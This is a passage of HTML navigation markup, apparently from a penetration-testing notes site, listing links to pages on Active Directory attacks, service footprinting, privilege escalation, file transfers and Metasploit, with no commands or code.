type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_3"> <span class="md-ellipsis"> Hunting for a User </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Hunting for a User" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_3"> <span class="md-nav__icon md-icon"></span> Hunting for a User </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/userhunting/enumerate_retrieve_pwdpol/"> <span class="md-ellipsis"> Enumerating &amp; Retrieving PwdPols </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/userhunting/pwd_spraying_target_user_list/"> <span class="md-ellipsis"> Pwd Spraying - Making a Targeted User List </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_4" id="__nav_4_3_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_4"> <span class="md-ellipsis"> PwSpray </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="PwSpray" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_4"> <span class="md-nav__icon md-icon"></span> PwSpray </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/spray_responsibility/internal_pwd_spray_from_linux/"> <span class="md-ellipsis"> Internal Spraying - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/spray_responsibility/internal_pwd_spray_from_windows/"> <span class="md-ellipsis"> Internal Spraying - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_5" id="__nav_4_3_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_5"> <span class="md-ellipsis"> Post Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Post Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_5"> <span class="md-nav__icon md-icon"></span> Post Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/deeper_down_the_rabbithole/enumerating_security_controls/"> <span class="md-ellipsis"> Enumerating Security Controls </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_linux/"> <span class="md-ellipsis"> Credentialed Enumeration - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_windows/"> <span class="md-ellipsis"> Credentialed Enumeration - Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/deeper_down_the_rabbithole/living_off_the_land/"> <span class="md-ellipsis"> Living Off The Land </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_6" id="__nav_4_3_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_6"> <span class="md-ellipsis"> Kerberoasting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Kerberoasting" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_6"> <span class="md-nav__icon md-icon"></span> Kerberoasting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/cooking_with_fire/kerberoasting_from_linux/"> <span class="md-ellipsis"> Kerberoasting - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/cooking_with_fire/kerberoasting_from_windows/"> <span class="md-ellipsis"> Kerberoasting - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_7" id="__nav_4_3_1_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_7"> <span class="md-ellipsis"> ACLs </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="ACLs" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_7"> <span class="md-nav__icon md-icon"></span> ACLs </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/acls/acl_enumeration/"> <span class="md-ellipsis"> ACL Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/acls/acl_abuse/"> <span class="md-ellipsis"> ACL Abuse Tactics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/acls/dcsync/"> <span class="md-ellipsis"> DCSync </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_8" id="__nav_4_3_1_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_8"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_8"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/stacking_the_deck/privileged_access/"> <span class="md-ellipsis"> Privileged Access </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/stacking_the_deck/kerberos_double_hop/"> <span class="md-ellipsis"> Kerberos Double Hop </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/stacking_the_deck/bleeding_edge_vulns/"> <span class="md-ellipsis"> Vulnerabilities </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/stacking_the_deck/miscellaneous_misconfigurations/"> <span class="md-ellipsis"> Misconfigurations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_9" id="__nav_4_3_1_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_9"> <span class="md-ellipsis"> Domain Trusts </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Domain Trusts" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_9"> <span class="md-nav__icon md-icon"></span> Domain Trusts </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/why_so_trusting/domain_trusts_primer/"> <span class="md-ellipsis"> Domain Trusts Primer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_win/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_10" id="__nav_4_3_1_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_10"> <span class="md-ellipsis"> Cross-Forest Trust Abuse </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cross-Forest Trust Abuse" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_10"> <span class="md-nav__icon md-icon"></span> Cross-Forest Trust Abuse </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_win/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_linux/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_11" id="__nav_4_3_1_11" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_11"> <span class="md-ellipsis"> Defensive Considerations </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Defensive Considerations" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_11"> <span class="md-nav__icon md-icon"></span> Defensive Considerations </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/defensive_considerations/hardening_ad/"> <span class="md-ellipsis"> Hardening Active Directory </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/defensive_considerations/additional_auditing_techniques/"> <span class="md-ellipsis"> Additional AD Auditing Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2" id="__nav_4_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2"> <span class="md-ellipsis"> Footprinting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Footprinting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_2"> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/domain_information/"> <span class="md-ellipsis"> Domain Information </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_2" id="__nav_4_3_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_2"> <span class="md-ellipsis"> Host Based Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Host Based Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_2"> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/nfs/"> <span class="md-ellipsis"> NFS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/smtp/"> <span class="md-ellipsis"> SMTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/imap_pop3/"> <span class="md-ellipsis"> IMAP/POP3 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/snmp/"> <span class="md-ellipsis"> SNMP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/mysql/"> <span class="md-ellipsis"> MySQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/mssql/"> <span class="md-ellipsis"> MSSQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/ipmi/"> <span class="md-ellipsis"> IPMI </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_3" id="__nav_4_3_2_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_3"> <span class="md-ellipsis"> Remote Management Protocols </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Management Protocols" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_3"> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/linux_remote_management_protocol/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../footprinting/windows_remote_management_protocol/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_3" id="__nav_4_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_3"> <span class="md-ellipsis"> Common Services </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Common Services" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_3"> <span class="md-nav__icon md-icon"></span> Common Services </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/interacting/"> <span class="md-ellipsis"> Interacting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_sql/"> <span class="md-ellipsis"> SQL Databases </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_rdp/"> <span class="md-ellipsis"> RDP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../attacking_common_services/attacking_email_services/"> <span class="md-ellipsis"> Email Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4" id="__nav_4_3_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_4"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1" id="__nav_4_3_4_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1"> <span class="md-ellipsis"> Windows </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_1"> <span class="md-nav__icon md-icon"></span> Windows </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_1" id="__nav_4_3_4_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_1"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Enumeration" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_1"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/gtlotl/"> <span class="md-ellipsis"> Situational Awareness </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/init_enum/"> <span class="md-ellipsis"> Initial Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/comm_with_ps/"> <span class="md-ellipsis"> Communication with Processes </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_2" id="__nav_4_3_4_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_2"> <span class="md-ellipsis"> User Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="User Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_2"> <span class="md-nav__icon md-icon"></span> User Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/seimpersonate_seassignprimarytoken/"> <span class="md-ellipsis"> SeImpersonate and SeAssignPrimaryToken </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/sebugpriv/"> <span class="md-ellipsis"> SeDebugPrivilege </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/setakeownershippriv/"> <span class="md-ellipsis"> SeTakeOwnershipPrivilege </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_3" id="__nav_4_3_4_1_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_3"> <span class="md-ellipsis"> Group Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Group Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_3"> <span class="md-nav__icon md-icon"></span> Group Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/builtin_groups/"> <span class="md-ellipsis"> Windows Built-in Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/eventlog_readers/"> <span class="md-ellipsis"> Event Log Readers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/dnsadmins/"> <span class="md-ellipsis"> DnsAdmins </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/hyperv_admins/"> <span class="md-ellipsis"> Hyper-V Administrators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/print_operators/"> <span class="md-ellipsis"> Print Operators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/server_operators/"> <span class="md-ellipsis"> Server Operators </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_4" id="__nav_4_3_4_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_4"> <span class="md-ellipsis"> OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="OS" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_4"> <span class="md-nav__icon md-icon"></span> OS </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/user_account_control/"> <span class="md-ellipsis"> User Account Control </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/weak_permissions/"> <span class="md-ellipsis"> Weak Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_5" id="__nav_4_3_4_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_5"> <span class="md-ellipsis"> Credential Theft </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Credential Theft" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_5"> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/other_files/"> <span class="md-ellipsis"> Other Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/further_credential_theft/"> <span class="md-ellipsis"> Further Credential Theft </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_6" id="__nav_4_3_4_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_6"> <span class="md-ellipsis"> Additional Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Additional Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_6"> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/interacting_with_users/"> <span class="md-ellipsis"> Interacting with Users </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/windows/miscellaneous_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2" id="__nav_4_3_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2"> <span class="md-ellipsis"> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_2"> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/enumeration/"> <span class="md-ellipsis"> Enumeration </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2_2" id="__nav_4_3_4_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2_2"> <span class="md-ellipsis"> Local Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Local Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_2_2"> <span class="md-nav__icon md-icon"></span> Local Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/kernel_exploits/"> <span class="md-ellipsis"> Kernel Exploits </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/cron_jobs/"> <span class="md-ellipsis"> Cron Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/special_permissions/"> <span class="md-ellipsis"> Special Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/sudo_rights_abuse/"> <span class="md-ellipsis"> Sudo Rights Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/path_abuse/"> <span class="md-ellipsis"> Path Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/wilcard_abuse/"> <span class="md-ellipsis"> Wildcard Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/shared_libraries/"> <span class="md-ellipsis"> Shared Libraries </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/shared_object_hijacking/"> <span class="md-ellipsis"> Shared Object Hijacking </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/privileged_groups/"> <span class="md-ellipsis"> Privileged Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../privesc/linux/misc_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5" id="__nav_4_3_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5"> <span class="md-ellipsis"> File Transfers </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Transfers" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_5"> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5_1" id="__nav_4_3_5_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5_1"> <span class="md-ellipsis"> File Tranfer Methods </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Tranfer Methods" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_5_1"> <span class="md-nav__icon md-icon"></span> File Tranfer Methods </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/windows_file_transfer_methods/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/linux_file_transfer_methods/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/transfering_files_w_code/"> <span class="md-ellipsis"> Transfering Files with Code </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/miscellaneous_file_transfer_methods/"> <span class="md-ellipsis"> Miscellaneous </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/protected_file_transfers/"> <span class="md-ellipsis"> Protected File Transfers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/catching_files_over_https/"> <span class="md-ellipsis"> Catching Files over HTTP/S </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_transfers/living_off_the_land/"> <span class="md-ellipsis"> LOTL </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6" id="__nav_4_3_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6"> <span class="md-ellipsis"> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Tools" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_6"> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/nmap/"> <span class="md-ellipsis"> Nmap </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2" id="__nav_4_3_6_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2"> <span class="md-ellipsis"> MSF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="MSF" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_6_2"> <span class="md-nav__icon md-icon"></span> MSF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_1" id="__nav_4_3_6_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_1"> <span class="md-ellipsis"> Components </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Components" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_1"> <span class="md-nav__icon md-icon"></span> Components </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_modules/"> <span class="md-ellipsis"> Modules </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_targets/"> <span class="md-ellipsis"> Targets </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/components/msf_payloads/"> <span class="md-ellipsis"> Payloads </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_2" id="__nav_4_3_6_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_2"> <span class="md-ellipsis"> Sessions </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Sessions" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_2"> <span class="md-nav__icon md-icon"></span> Sessions </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/sessions/msf_sessions_jobs/"> <span class="md-ellipsis"> Sessions &amp; Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/sessions/msf_sessions_meterpreter/"> <span class="md-ellipsis"> Meterpreter </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/msf/additional_features/evasion/"> <span class="md-ellipsis"> Evasion </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7" id="__nav_4_3_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7"> <span class="md-ellipsis"> 